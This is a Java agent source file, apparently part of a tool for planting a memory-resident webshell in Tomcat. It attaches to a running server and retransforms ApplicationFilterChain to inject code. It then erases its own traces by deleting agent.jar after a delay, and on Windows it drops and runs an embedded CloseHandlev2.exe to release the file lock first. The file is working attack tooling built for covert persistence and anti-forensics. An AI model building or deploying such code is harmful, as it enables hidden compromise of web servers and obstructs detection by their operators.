package com.agentmem;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;
import java.lang.management.ManagementFactory;
import java.lang.management.RuntimeMXBean;

public class Agent {

    public static String className = "org.apache.catalina.core.ApplicationFilterChain";
    public static String currentPath;
    public static void agentmain(String agentArgs, Instrumentation inst) throws Exception {
        Agent.currentPath = agentArgs;
        System.out.println("[Agent] Agentmain method");
        System.out.println(Agent.currentPath);
        System.out.println(agentArgs);
        transformClass(inst);
    }

    private static void transformClass(Instrumentation instrumentation) throws Exception {
        Transformer transform = new Transformer();
        instrumentation.addTransformer(transform, true);
        Class[] loadedClasses = instrumentation.getAllLoadedClasses();
        for (Class c : loadedClasses) {
            if (c.getName().equals(className)) {
                try {
                    instrumentation.retransformClasses(c);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
        System.out.println("Agent done transformer");
        try {
            System.out.println("Agent start clear files");
            clear(Agent.currentPath);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }


    public static void clear(String currentPath) throws Exception {
        Thread clearThread = new Thread() {

            public void run() {
                try {
                    Thread.sleep(20000);
                    String agentFile = currentPath + "agent.jar";
                    String OS = System.getProperty("os.name").toLowerCase();
                    if (OS.indexOf("windows") >= 0) {
                        try {
                            unlockFile(currentPath);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                    try {
                        new File(agentFile).delete();
                    }
                    catch (Exception e) {
                        throw new RuntimeException(e);
                    }
                }
                catch (Exception e) {
                    throw new RuntimeException(e);
                }
            }
        };
        clearThread.start();

    }

    public static void unlockFile(String currentPath) throws Exception {
        if (currentPath.matches("^/[A-Za-z]:/.*")) {
            currentPath = currentPath.substring(1);
        }
        String exePath = currentPath + "CloseHandlev2.exe";
        String agentFilePath = currentPath + "agent.jar";
        InputStream is = Agent.class.getClassLoader().getResourceAsStream("bin/CloseHandlev2.exe");
        FileOutputStream fos = new FileOutputStream(new File(exePath).getCanonicalPath());
        byte[] bytes = new byte[1024 * 100];
        int num = 0;
        while ((num = is.read(bytes)) != -1) {
            fos.write(bytes, 0, num);
            fos.flush();
        }
        fos.close();
        is.close();
        Process process = java.lang.Runtime.getRuntime().exec(exePath + " " + getCurrentPid() + " " + agentFilePath + " --confirm-close");
        try {
            process.waitFor();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        new File(exePath).delete();
    }

    public static String getCurrentPid() {
        RuntimeMXBean runtimeMXBean = ManagementFactory.getRuntimeMXBean();
        return runtimeMXBean.getName().split("@")[0];
    }
}
